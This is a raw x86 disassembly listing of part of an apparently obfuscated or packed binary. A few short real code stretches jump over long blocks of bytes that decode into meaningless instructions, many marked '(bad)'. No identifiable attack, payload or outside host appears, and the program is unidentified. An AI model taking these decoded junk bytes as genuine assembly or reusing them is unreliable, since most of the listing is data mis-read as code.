  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi+0x7e21f2dc],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	outs   dx,BYTE PTR ds:[esi]
  406557:	js     0x406585
  406559:	imul   DWORD PTR [edi+edi*1-0xe]
  40655d:	gs arpl sp,bx
  406560:	fcomp  st(3)
  406562:	sti    
  406563:	cmp    edx,DWORD PTR [ebx]
  406565:	or     eax,0xb7b088b7
  40656a:	sub    bh,ch
  40656c:	mov    ah,cl
  40656e:	pop    ecx
  40656f:	aaa    
  406570:	aam    0x2
  406572:	out    dx,eax
  406573:	cdq    
  406574:	jne    0x4065a4
  406576:	push   es
  406577:	cmc    
  406578:	mov    DWORD PTR [eax-0x3ee80f71],ebx
  40657e:	pop    ds
  40657f:	mov    eax,0xd1c895fa
  406584:	xor    al,0x56
  406586:	retf   
  406587:	cmc    
  406588:	cwde   
  406589:	call   0x1412:0xa67ec923
  406590:	ja     0x4065fe
  406592:	xor    BYTE PTR [edi],ch
  406594:	int3   
  406595:	clc    
  406596:	lock popf 
  406598:	mov    ah,0xd2
  40659a:	lds    esp,FWORD PTR [ebp-0x56adb0c9]
  4065a0:	mov    ah,0xf9
  4065a2:	push   ss
  4065a3:	jg     0x40657e
  4065a5:	sub    ch,BYTE PTR [ecx-0x1d]
  4065a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a9:	fisttp DWORD PTR ds:0xdd8dff33
  4065af:	add    DWORD PTR [ecx+0x3e],0xbb009573
  4065b6:	push   edx
  4065b7:	and    BYTE PTR [eax-0x141416d0],ch
  4065bd:	jae    0x4065ca
  4065bf:	stos   DWORD PTR es:[edi],eax
  4065c0:	and    eax,0x93bf792f
  4065c5:	mov    WORD PTR [ebx-0x325250ea],gs
  4065cb:	popf   
  4065cc:	inc    ebp
  4065cd:	jno    0x4065ed
  4065cf:	mov    ebp,DWORD PTR [edx-0xd]
  4065d2:	fst    DWORD PTR [ecx-0x2a482571]
  4065d8:	es out 0xd0,eax
  4065db:	mov    ah,0xaf
  4065dd:	push   ebx
  4065de:	xchg   DWORD PTR [esi+0x57],esp
  4065e1:	loopne 0x406581
  4065e3:	push   edx
  4065e4:	inc    ebx
  4065e5:	ror    BYTE PTR [esi-0xc],1
  4065e8:	push   0x652476d9
  4065ed:	loopne 0x4065ab
  4065ef:	and    cl,BYTE PTR ds:0x89516157
  4065f5:	cmp    al,al
  4065f7:	scas   eax,DWORD PTR es:[edi]
  4065f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065f9:	mov    al,bh
  4065fb:	sbb    al,0xc2
  4065fd:	xchg   ebp,eax
  4065fe:	push   esp
  4065ff:	fdivr  DWORD PTR [ebx+eax*1]
  406602:	popf   
  406603:	xor    esp,edx
  406605:	fldcw  WORD PTR [edx+0x645cf0f]
  40660b:	mov    al,0x62
  40660d:	cwde   
  40660e:	mov    eax,0x5423a81d
  406613:	mov    ebx,0x76ccb642
  406618:	inc    esi
  406619:	pushf  
  40661a:	mov    al,ds:0x3aeec36f
  40661f:	cmp    BYTE PTR [eax],bl
  406621:	rcl    ecx,1
  406623:	jge    0x4065de
  406625:	outs   dx,DWORD PTR ds:[esi]
  406626:	out    dx,al
  406627:	inc    edi
  406628:	fiadd  WORD PTR [edi-0x2937a95]
  40662e:	lock mov al,0x6e
  406631:	sbb    ah,al
  406633:	ins    DWORD PTR es:[edi],dx
  406634:	xor    eax,0x9d65312e
  406639:	test   DWORD PTR [ecx],0x57bdd3c1
  40663f:	dec    edi
  406640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406641:	sbb    ebp,DWORD PTR [bp+di-0x78]
  406645:	pop    edi
  406646:	xchg   eax,ebp
  406648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406649:	jns    0x406630
  40664b:	xor    ebx,DWORD PTR [edi+0x6a]
  40664e:	les    ebp,FWORD PTR [edx+0x53]
  406651:	jo     0x4065fd
  406653:	or     al,0x76
  406655:	cmp    ebp,DWORD PTR [edi+0x3d60ebd1]
  40665b:	push   ss
  40665c:	shl    BYTE PTR [esi],0xc0
  40665f:	(bad)  
  406660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406661:	mov    al,ds:0xc6f33ce1
  406666:	xor    bl,BYTE PTR [eax]
  406668:	popf   
  406669:	or     al,0x9c
  40666b:	pop    eax
  40666c:	cmp    eax,0x9dcb1c33
  406671:	dec    ebp
  406672:	xchg   esi,eax
  406673:	in     al,0xc9
  406675:	(bad)  
  406677:	ror    DWORD PTR [ebp+0x7b],cl
  40667a:	daa    
  40667b:	xchg   ebp,eax
  40667c:	mov    dh,0x13
  40667e:	mov    ebp,0xf1813c84
  406683:	fdiv   DWORD PTR [ecx]
  406685:	adc    ebx,DWORD PTR [ebx+0x2e]
  406688:	mov    DWORD PTR [ebx-0x27],ecx
  40668b:	mov    edx,DWORD PTR [ebp-0x6bd4bdab]
  406691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406692:	out    0xa5,al
  406694:	pop    es
  406695:	aam    0xd5
  406697:	xchg   edx,eax
  406698:	lahf   
  406699:	test   DWORD PTR [edx],esi
  40669b:	faddp  st(1),st
  40669d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40669e:	sub    eax,0x8afaffbc
  4066a3:	nop
  4066a4:	jle    0x4066f6
  4066a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a7:	jnp    0x406688
  4066a9:	jns    0x406686
  4066ab:	adc    ah,BYTE PTR [eax]
  4066ad:	ror    BYTE PTR [edx],1
  4066af:	out    0x4f,eax
  4066b1:	push   edi
  4066b2:	iret   
  4066b3:	xchg   esi,eax
  4066b4:	pushf  
  4066b5:	mov    bh,BYTE PTR [ebx]
  4066b7:	cmp    al,dl
  4066b9:	pop    ax
  4066bb:	and    eax,0x2797b194
  4066c0:	gs push ss
  4066c2:	push   cs
  4066c3:	popa   
  4066c4:	sub    al,0x84
  4066c6:	addr16 xchg ebx,eax
  4066c8:	mov    ecx,0xf398273
  4066cd:	push   cs
  4066ce:	(bad)
  4066d1:	retf   0xece7
  4066d4:	test   bh,ch
  4066d6:	pop    esp
  4066d7:	fidivr DWORD PTR ds:0x3b2d2c2f
  4066dd:	outs   dx,DWORD PTR ds:[esi]
  4066de:	aad    0x86
  4066e0:	mov    cl,BYTE PTR [esi+0x5225d110]
  4066e6:	mov    al,ds:0xa13a9469
  4066eb:	fwait
  4066ec:	ror    BYTE PTR [ecx+edi*1-0x49bc95fc],0xa0
  4066f4:	stos   BYTE PTR es:[edi],al
  4066f5:	inc    eax
  4066f7:	jmp    0x4066c3
  4066f9:	enter  0x6cb9,0x2b
  4066fd:	scas   al,BYTE PTR es:[edi]
  4066fe:	aas    
  4066ff:	push   0x67
  406701:	dec    edx
  406702:	std    
  406703:	push   esp
  406704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406705:	aaa    
  406706:	daa    
  406707:	jle    0x406754
  406709:	into   
  40670a:	or     BYTE PTR [ebx-0x13],dh
  40670d:	test   eax,0x8f65e2f6
  406712:	pop    ebp
  406713:	mov    ah,0xad
  406715:	popf   
  406716:	lods   al,BYTE PTR ds:[esi]
  406717:	imul   ecx,DWORD PTR [esi+0x53],0x5c9b0a36
  40671e:	aad    0x4c
  406720:	enter  0x819b,0xca
  406724:	into   
  406725:	test   al,0x77
  406727:	aad    0x3
  406729:	add    bh,BYTE PTR [eax]
  40672b:	in     al,0x18
  40672d:	inc    edx
  40672e:	mov    dh,0x7d
  406730:	out    0x1f,al
  406732:	(bad)  
  406733:	jnp    0x4066c5
  406735:	sub    al,0xcf
  406737:	jle    0x406744
  406739:	sub    al,al
  40673b:	adc    eax,0x3f253609
  406740:	(bad)
  406743:	or     DWORD PTR [edi],0x5437013f
  406749:	xchg   ebx,eax
  40674b:	les    ebp,FWORD PTR [edx]
  40674d:	pop    eax
  40674e:	mov    esp,0x2bd9ed4e
  406753:	mov    bh,0x59
  406755:	jp     0x406735
  406757:	call   0x75b3:0x771f8ad5
  40675e:	scas   eax,DWORD PTR es:[edi]
  40675f:	aaa    
  406760:	mov    dh,0xc6
  406762:	(bad)  [ecx]
  406764:	or     DWORD PTR [edx],0x28
  406767:	outs   dx,DWORD PTR ds:[esi]
  406768:	ret    0xe1b6
  40676b:	inc    edi
  40676c:	dec    eax
  40676d:	test   eax,0xba54108a
  406772:	ficomp WORD PTR [esi]
  406774:	pushf  
  406775:	mov    WORD PTR [eax],ss
  406777:	lock test BYTE PTR [eax-0x231f0f1d],bl
  40677e:	jno    0x4067dc
  406780:	test   DWORD PTR [edx+edi*2+0x1fd787b],esp
  406787:	and    eax,0x64f20cec
  40678c:	test   BYTE PTR ds:0xabd71329,0x93
  406793:	push   ebx
  406794:	frstor [esp+edx*4]
  406797:	xor    ecx,ebx
  406799:	fisttp WORD PTR [ebx-0x2e]
  40679c:	sub    DWORD PTR [edi-0x24db5834],esi
  4067a2:	int    0x4e
  4067a4:	leave  
  4067a5:	sub    esp,DWORD PTR ds:0xefa82c14
  4067ab:	xor    BYTE PTR [esi-0x204f46e9],al
  4067b1:	nop
  4067b2:	shr    DWORD PTR gs:[ebp+0x704edf99],0x37
  4067ba:	jns    0x406831
  4067bc:	sbb    edi,DWORD PTR ds:0x8c6cad35
  4067c2:	push   cs
  4067c3:	(bad)  [esi+0x63ee2fc5]
  4067c9:	adc    al,0x61
  4067cb:	jg     0x40680f
  4067cd:	and    BYTE PTR [esp+ebx*8],dh
  4067d0:	pop    esi
  4067d1:	sub    ah,BYTE PTR [eax+0x46f72ea]
  4067d7:	jno    0x40678f
  4067d9:	cwde   
  4067da:	jb     0x406835
  4067dc:	sar    BYTE PTR [edx-0x2dbe626a],1
  4067e2:	popa   
  4067e3:	fild   WORD PTR [edi]
  4067e5:	neg    BYTE PTR [edi+0x39ef4f0d]
  4067eb:	cdq    
  4067ec:	mov    al,ds:0x542446f4
  4067f1:	xchg   esi,eax
  4067f2:	fisttp DWORD PTR [esi+0x2b]
  4067f5:	sar    edi,0x7
  4067f8:	mov    ah,0xf2
  4067fa:	bound  esi,QWORD PTR [ebp-0x9]
  4067fd:	add    al,BYTE PTR [ebp+0x3e]
  406800:	sub    DWORD PTR [esp+ebp*8-0x74752b1d],ecx
  406807:	repnz inc esi
  406809:	push   es
  40680a:	cli    
  40680b:	ret    
  40680c:	vmwrite edi,DWORD PTR ss:[ecx-0x207f1b29]
  406814:	pusha  
  406815:	pop    ebx
  406816:	gs pop es
  406818:	sub    al,0xd3
  40681a:	cs mov al,0xc9
  40681d:	or     esi,DWORD PTR [edx]
  40681f:	sti    
  406820:	xchg   ch,ah
  406822:	adc    BYTE PTR es:[eax],ah
  406825:	and    BYTE PTR [ebp-0x1d],0xe4
  406829:	sub    eax,0xf177e379
  40682e:	aam    0x68
  406830:	leave  
  406831:	test   eax,0x2075ff9e
  406836:	ins    BYTE PTR es:[edi],dx
  406837:	std    
  406838:	neg    BYTE PTR [edx+0x4d739683]
  40683e:	stc    
  40683f:	add    ecx,DWORD PTR [eax]
  406841:	adc    eax,0xabe69076
  406846:	cmp    DWORD PTR [ebx],0x13e144d6
  40684c:	push   es
  40684d:	sub    al,0xe0
  40684f:	mov    esi,0x18669438
  406854:	xchg   ebx,eax
  406855:	ret    
  406856:	mov    esp,0x67569940
  40685b:	dec    ebx
  40685c:	inc    edx
  40685d:	dec    eax
  40685e:	je     0x4068af
  406860:	adc    ebx,DWORD PTR [ebx+0x59]
  406863:	test   ch,ch
  406865:	adc    al,0x59
  406867:	sbb    ah,BYTE PTR [esp+ebp*8-0xc32e6da]
  40686e:	jne    0x406824
  406870:	jl     0x4068df
  406872:	sbb    al,0xd4
  406874:	pop    edx
  406875:	add    cl,BYTE PTR [esi]
  406877:	lods   eax,DWORD PTR ds:[esi]
  406878:	jb     0x40682b
  40687a:	inc    DWORD PTR [edx+0x2a]
  40687d:	test   bl,dh
  40687f:	mov    ecx,eax
  406881:	jno    0x406820
  406883:	pusha  
  406884:	adc    DWORD PTR [edx+edx*8-0x195cf9c4],ebx
  40688b:	stc    
  40688c:	or     bl,BYTE PTR [esi+0x27a0d6bf]
  406892:	cmp    al,0xf4
  406894:	mov    bh,0x57
  406896:	cs or  al,0x2d
  406899:	mov    ecx,0xfb1a9509
  40689e:	fsub   DWORD PTR ds:0x54d2383c
  4068a4:	push   esp
  4068a5:	or     al,0x14
  4068a7:	add    ecx,esp
  4068a9:	sbb    ah,al
  4068ab:	arpl   sp,di
  4068ad:	(bad)  
  4068ae:	lea    ebp,[ebp-0x45d954a4]
  4068b4:	out    dx,al
  4068b5:	sub    dl,cl
  4068b7:	mov    eax,ds:0xcab2a6f6
  4068bc:	ins    BYTE PTR es:[edi],dx
  4068bd:	jbe    0x40692c
  4068bf:	ror    DWORD PTR [esi],1
  4068c1:	cmp    DWORD PTR [ebx+0x60fdb4ad],edi
  4068c7:	hlt    
  4068c8:	cmp    bl,BYTE PTR [edx-0x23b6645]
  4068ce:	mov    ds:0x3f25f922,eax
  4068d3:	pop    ebp
  4068d4:	cmc    
  4068d5:	iret   
  4068d6:	or     BYTE PTR [edx],bl
  4068d8:	xor    eax,0xfcefab1
  4068dd:	jo     0x40691e
  4068df:	pop    ds
  4068e0:	jne    0x40689f
  4068e2:	jle    0x40689d
  4068e4:	sbb    eax,0x32876be3
  4068e9:	sub    dl,dh
  4068eb:	inc    esi
  4068ec:	cwde   
  4068ed:	imul   esp,DWORD PTR [ecx-0x291eef4b],0xe56fea18
  4068f7:	sbb    al,0x55
  4068f9:	loop   0x40688e
  4068fb:	and    DWORD PTR [esi],eax
  4068fd:	das    
  4068fe:	nop
  4068ff:	jb     0x406900
  406901:	jb     0x406884
  406903:	or     BYTE PTR [esi+0x10],0xad
  406907:	nop
  406908:	jle    0x40689a
  40690a:	leave  
  40690b:	or     BYTE PTR [esi-0x49],dh
  40690e:	lods   al,BYTE PTR ds:[esi]
  40690f:	mov    ch,0x11
  406911:	mov    edi,0x1dce0b5a
  406916:	addr16 shl ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0x7091c3be
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	out    0xb9,eax
  406982:	in     al,dx
  406983:	cs jo  0x40695e
  406986:	mov    edi,0x6bd8d723
  40698b:	push   edi
  40698c:	xor    ah,BYTE PTR [esp+ebx*4-0x14a3ac76]
  406993:	pushf  
  406994:	push   ds
  406995:	shr    BYTE PTR [edx+0x5cb7b29d],1
  40699b:	lods   eax,DWORD PTR ds:[esi]
  40699c:	cmp    edi,esp
  40699e:	xchg   edi,eax
  40699f:	inc    esi
  4069a0:	pop    ds
  4069a1:	imul   ebx,DWORD PTR [esi+eiz*1],0xf1f5e5cf
  4069a8:	jo     0x40696e
  4069aa:	mov    DWORD PTR [ebx+0x1e],ecx
  4069ad:	in     al,dx
  4069ae:	addr16 nop
  4069b0:	sub    BYTE PTR [eax-0xf],cl
  4069b3:	mov    ebp,ebx
  4069b5:	popf   
  4069b6:	jb     0x4069ef
  4069b8:	fs lock mov ax,di
  4069bd:	or     ah,BYTE PTR [eax-0x6cdc10c6]
  4069c3:	test   al,0x68
  4069c5:	lock push eax
  4069c7:	xor    DWORD PTR [eax+0x251eab6f],edi
  4069cd:	iret   
  4069ce:	or     ah,BYTE PTR [esi+0x59]
  4069d1:	adc    ecx,esp
  4069d3:	scas   al,BYTE PTR es:[edi]
  4069d4:	fistp  DWORD PTR [edx+0x23b7f78e]
  4069da:	jbe    0x406a18
  4069dc:	out    dx,al
  4069dd:	adc    ebx,esp
  4069df:	mov    ch,0x33
  4069e1:	jmp    0x4069a3
  4069e3:	push   0xffffffae
  4069e5:	cmp    al,0xf4
  4069e7:	imul   ebx,DWORD PTR [ebp-0x2f],0xf
  4069eb:	mov    DWORD PTR [edx],esp
  4069ed:	(bad)
  4069f0:	cmc    
  4069f1:	ret    
  4069f2:	sbb    edi,DWORD PTR ss:[edx+eax*4+0xc836aae]
  4069fa:	xor    DWORD PTR [ebp+eax*8-0x5045e868],edi
  406a01:	shl    DWORD PTR [edi],1
  406a03:	sbb    al,0x7f
  406a05:	test   BYTE PTR [ebx+0x5a],0x71
  406a09:	jno    0x406a05
  406a0b:	fild   DWORD PTR [eax+esi*2-0x7d]
  406a0f:	out    0xb,eax
  406a11:	cwde   
  406a12:	(bad)  
  406a13:	xchg   edi,eax
  406a14:	dec    ebp
  406a15:	stos   BYTE PTR es:[edi],al
  406a16:	jecxz  0x4069ec
  406a18:	ins    DWORD PTR es:[edi],dx
  406a19:	stos   DWORD PTR es:[edi],eax
  406a1a:	mov    eax,ds:0x41961fd7
  406a1f:	bound  ebx,QWORD PTR [esi+0x60]
  406a22:	pop    edi
  406a23:	and    dh,ch
  406a25:	sbb    BYTE PTR [ebp+0x26],bl
  406a28:	mov    dh,0xab
  406a2a:	sub    DWORD PTR [ecx],0x10717804
  406a30:	pop    edx
  406a31:	std    
  406a32:	addr16 dec edx
  406a34:	aaa    
  406a35:	clc    
  406a36:	cmp    BYTE PTR [ebp+0x76],dl
  406a39:	mov    BYTE PTR ds:0x6a2d80ae,bh
  406a3f:	add    al,0xd8
  406a41:	(bad)  
  406a42:	push   edx
  406a43:	cs mov al,0x2a
  406a46:	sahf   
  406a47:	cli    
  406a48:	cmp    eax,0x3159a59d
  406a4d:	mov    bl,0x86
  406a4f:	ins    DWORD PTR es:[edi],dx
  406a50:	hlt    
  406a51:	dec    esi
  406a52:	dec    esi
  406a53:	test   eax,0xf1e7f72a
  406a58:	sub    ah,cl
  406a5a:	mov    ecx,0x25323997
  406a5f:	sub    esp,edi
  406a61:	arpl   si,si
  406a63:	xchg   ax,ax
  406a65:	jnp    0x406a2d
  406a67:	mov    dh,0x2d
  406a69:	cmp    al,BYTE PTR [esi+0x72]
  406a6c:	cwde   
  406a6d:	mov    eax,0xcf0f41a2
  406a72:	imul   DWORD PTR [edx]
  406a74:	sub    al,0x4e
  406a76:	sti    
  406a77:	xchg   BYTE PTR [edi+ebx*4-0x4b59d8d2],dl
  406a7e:	mov    gs,WORD PTR [ebx-0x157c31d]
  406a84:	loop   0x406a6a
  406a86:	sbb    eax,0x2f9379ee
  406a8b:	leave  
  406a8c:	jg     0x406ab6
  406a8e:	push   edx
  406a8f:	fistp  WORD PTR [edx-0x24]
  406a92:	xlat   BYTE PTR ds:[ebx]
  406a93:	lahf   
  406a94:	jp     0x406ab7
  406a96:	mov    ds:0xddb26797,al
  406a9b:	call   0x524a:0x32d9e3ab
  406aa2:	push   0xeba9ceb8
  406aa7:	les    edi,FWORD PTR [ebx]
  406aa9:	mov    esp,0xe60dbc1b
  406aae:	xchg   BYTE PTR [ecx],bl
  406ab0:	loopne 0x406b2c
  406ab2:	inc    edx
  406ab3:	adc    ebp,DWORD PTR [ebp+0x6c]
  406ab6:	sahf   
  406ab7:	dec    ecx
  406ab8:	mov    DWORD PTR [esi-0x40],ebp
  406abb:	cld    
  406abc:	xlat   BYTE PTR ds:[ebx]
  406abd:	xor    DWORD PTR [esi+eax*4],esi
  406ac0:	add    edi,DWORD PTR [esi]
  406ac2:	test   BYTE PTR [ebx+0x13],0x9c
  406ac6:	lods   al,BYTE PTR ds:[esi]
  406ac7:	and    DWORD PTR [edi],esi
  406ac9:	pop    edx
  406aca:	and    al,BYTE PTR [edx-0x6f188072]
  406ad0:	leave  
  406ad1:	push   ss
  406ad2:	and    BYTE PTR [edi+0x56de4cd5],ch
  406ad8:	outs   dx,BYTE PTR ds:[esi]
  406ad9:	jl     0x406a80
  406adb:	retf   0xcca1
  406ade:	inc    ebx
  406adf:	cmc    
  406ae0:	pop    esp
  406ae1:	push   cs
  406ae2:	sub    al,bh
  406ae4:	pop    ebx
  406ae5:	sahf   
  406ae6:	or     bl,ch
  406ae8:	push   0xfffffff1
  406aea:	rcr    DWORD PTR [ebx+edx*2-0x20],0xba
  406aef:	mov    ebp,0x8b7b0aef
  406af4:	xchg   DWORD PTR [ecx-0x2],esp
  406af7:	imul   eax,DWORD PTR [ebx-0x7b7affaa],0x3472a9a0
  406b01:	sub    al,0x52
  406b03:	div    DWORD PTR [edi-0x799283ed]
  406b09:	scas   al,BYTE PTR es:[edi]
  406b0a:	rol    DWORD PTR [eax+0xb],cl
  406b0d:	push   0xa4ccd436
  406b12:	mov    al,0x90
  406b14:	sbb    edx,DWORD PTR [ecx]
  406b16:	imul   ecx,DWORD PTR [ebp-0x5f8e04],0xc543a2f9
  406b20:	jg     0x406b87
  406b22:	repnz popa 
  406b24:	int3   
  406b25:	mov    ds:0x6027591f,eax
  406b2a:	cmp    eax,0x519f4e38
  406b2f:	inc    esp
  406b30:	dec    ebx
  406b31:	pop    ebp
  406b32:	out    0xbd,eax
  406b34:	nop
  406b35:	dec    esi
  406b36:	cwde   
  406b37:	xchg   ebx,eax
  406b38:	and    DWORD PTR [ebp-0x14],0xcf4408f5
  406b3f:	jo     0x406bae
  406b41:	int    0x1a
  406b43:	fs shr dh,1
  406b46:	es ret 
  406b48:	imul   esi,DWORD PTR [edi-0x21c49775],0xc84ffb1
  406b52:	sbb    BYTE PTR [ebx],cl
  406b54:	xor    bl,BYTE PTR [edx-0x2aa79068]
  406b5a:	sub    edx,ebx
  406b5c:	adc    DWORD PTR [ecx],ebx
  406b5e:	popa   
  406b5f:	dec    eax
  406b60:	mov    dl,0x9
  406b62:	jle    0x406b92
  406b64:	in     al,dx
  406b65:	loope  0x406b69
  406b67:	rcr    edi,cl
  406b69:	mov    edi,0x6be6a636
  406b6e:	mov    al,0x72
  406b70:	inc    esi
  406b71:	enter  0x2619,0x57
  406b75:	mov    esp,0x30d48e92
  406b7a:	pushf  
  406b7b:	in     al,dx
  406b7c:	sbb    al,0xce
  406b7e:	loop   0x406b26
  406b80:	push   ebx
  406b81:	shl    bl,0x44
  406b84:	and    al,0xc
  406b86:	fs jge 0x406b76
  406b89:	ret    0x9ee5
  406b8c:	push   eax
  406b8d:	push   eax
  406b8e:	push   ebp
  406b8f:	ss jae 0x406c0f
  406b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b93:	pop    es
  406b94:	jbe    0x406c00
  406b96:	mov    bh,BYTE PTR [ebp+0x3bd2028b]
  406b9c:	aas    
  406b9d:	push   ds
  406b9e:	out    0xfa,al
  406ba0:	sbb    bh,BYTE PTR fs:[edi+0x60cd225d]
  406ba7:	hlt    
  406ba8:	add    edi,DWORD PTR [eax+0x1983675b]
  406bae:	fist   WORD PTR [ebx+0x32]
  406bb1:	scas   al,BYTE PTR es:[edi]
  406bb2:	jnp    0x406be9
  406bb4:	ds xchg ebx,eax
  406bb6:	pop    ecx
  406bb7:	imul   ebp,DWORD PTR [ecx-0x42eea081],0x4c1444d5
  406bc1:	sbb    al,0x97
  406bc3:	sbb    DWORD PTR [ecx+0x361a20f2],edx
  406bc9:	cs push edi
  406bcb:	cmp    eax,0x5bae8a3a
  406bd0:	add    BYTE PTR [ebx],0xfc
  406bd3:	rcl    BYTE PTR [esi+0x71],cl
  406bd6:	scas   eax,DWORD PTR es:[edi]
  406bd7:	(bad)  
  406bd8:	cmp    ebp,DWORD PTR [esi]
  406bda:	xchg   edx,eax
  406bdb:	imul   ecx,DWORD PTR [edx-0x41062eee],0x9f427275
  406be5:	mov    al,ds:0x4f271c6d
  406bea:	xchg   dh,ch
  406bec:	or     al,0x3e
  406bee:	push   0xffffffc0
  406bf0:	lds    ebx,FWORD PTR [eax]
  406bf2:	shl    DWORD PTR [edx+0x2f],0x1e
  406bf6:	test   al,0xcc
  406bf8:	js     0x406be6
  406bfa:	mov    BYTE PTR [edx],al
  406bfc:	cmp    edx,ecx
  406bfe:	test   BYTE PTR [ecx+edx*2-0x72],al
  406c02:	fistp  DWORD PTR [esp+ebp*4+0x3ab58bd6]
  406c09:	out    0xf5,al
  406c0b:	pop    ss
  406c0c:	fld    DWORD PTR [edx-0x2ae12650]
  406c12:	not    edi
  406c14:	rol    BYTE PTR [esi-0x56e4dda2],0xac
  406c1b:	mov    dl,0x5c
  406c1d:	inc    ebp
  406c1e:	aad    0xa6
  406c20:	and    al,0x27
  406c22:	call   0x34da:0x9f091f63
  406c29:	and    ecx,0xb7be26fc
  406c2f:	mov    eax,0xc7f1f86f
  406c34:	retf   
  406c35:	ds xor DWORD PTR gs:[ecx+eiz*4-0x55],ebp
  406c3b:	loope  0x406c8e
  406c3d:	or     al,0xb2
  406c3f:	aas    
  406c40:	gs (bad) 
  406c42:	(bad)  
  406c43:	mov    dh,0x18
  406c45:	lods   al,BYTE PTR ds:[esi]
  406c46:	mov    ebp,0x6ec4b32c
  406c4b:	ret    
  406c4c:	out    dx,al
  406c4d:	add    esi,DWORD PTR [edi-0x62bc467]
  406c53:	jae    0x406cc4
  406c55:	inc    edi
  406c56:	fs and ecx,edx
  406c59:	push   ebx
  406c5a:	pop    ds
  406c5b:	add    bl,BYTE PTR [esp+eiz*2-0x6b]
  406c5f:	lds    esp,FWORD PTR [bp-0x5]
  406c63:	ins    DWORD PTR es:[edi],dx
  406c64:	add    eax,0xe4fec94
  406c69:	(bad)  
  406c6a:	lods   al,BYTE PTR ds:[esi]
  406c6b:	cmp    BYTE PTR [esi+edi*2-0x4],bh
  406c6f:	int    0x8
  406c71:	jmp    0x406c6a
  406c73:	add    al,0xe2
  406c75:	inc    edi
  406c76:	int    0x49
  406c78:	cmp    al,BYTE PTR ds:0xea7942d0
  406c7e:	mov    bl,0x17
  406c80:	addr16 ja 0x406c1d
  406c83:	iret   
  406c84:	jmp    0xd07a2788
  406c89:	pop    edx
  406c8a:	pop    edi
  406c8b:	inc    edi
  406c8c:	int3   
  406c8d:	outs   dx,BYTE PTR ds:[esi]
  406c8e:	jmp    0xf370:0xac0bba37
  406c95:	ins    DWORD PTR es:[edi],dx
  406c96:	jbe    0x406c26
  406c98:	(bad)  
  406c99:	in     eax,0xd8
  406c9b:	addr16 std 
  406c9d:	inc    edi
  406c9e:	push   ds
  406c9f:	mov    esp,0xffbeb78b
  406ca4:	sbb    edi,DWORD PTR [esp+edx*1-0x4af6c91e]
  406cab:	in     al,dx
  406cac:	or     DWORD PTR [edi-0x3f545336],0xf81744f8
  406cb6:	fcmovnbe st,st(0)
  406cb8:	idiv   DWORD PTR [eax]
  406cba:	pop    es
  406cbb:	sub    esi,edi
  406cbd:	dec    ebx
  406cbe:	mov    DWORD PTR [eax+esi*4+0x4d],edx
  406cc2:	scas   al,BYTE PTR es:[edi]
  406cc3:	lahf   
  406cc4:	push   ds
  406cc5:	ret    
  406cc6:	lds    ebp,FWORD PTR [edx+0x2a]
  406cc9:	mov    bl,0xe6
  406ccb:	mov    esp,0xaf55672f
  406cd0:	aam    0x1d
  406cd2:	div    DWORD PTR [ecx+0x3091f223]
  406cd8:	fsub   DWORD PTR [edi+0x37294b17]
  406cde:	cs int3 
  406ce0:	push   esi
  406ce1:	xchg   BYTE PTR [eax+0xd],ah
  406ce4:	das    
  406ce5:	ss add al,0xa7
  406ce8:	cs mov esp,0x6d4a1afd
  406cee:	outs   dx,BYTE PTR ds:[esi]
  406cef:	adc    bl,ah
  406cf1:	rol    DWORD PTR [ecx+0x13],0x22
  406cf5:	adc    bl,bh
  406cf7:	loop   0x406d5e
  406cf9:	cmp    esi,edx
  406cfb:	sub    eax,0x369371f4
  406d00:	and    ecx,ebx
  406d02:	inc    eax
  406d03:	mov    cl,0xd3
  406d05:	repnz cld 
  406d07:	push   ss
  406d08:	shl    BYTE PTR [esi],1
  406d0a:	mov    bl,0x7f
  406d0c:	aad    0x1f
  406d0e:	fs push edi
  406d10:	pop    ds
  406d11:	fistp  QWORD PTR [edx+edx*2-0xfa22090]
  406d18:	dec    esp
  406d19:	xor    bl,BYTE PTR [edx]
  406d1b:	fiadd  DWORD PTR [ebp+eax*2+0x3cc6714e]
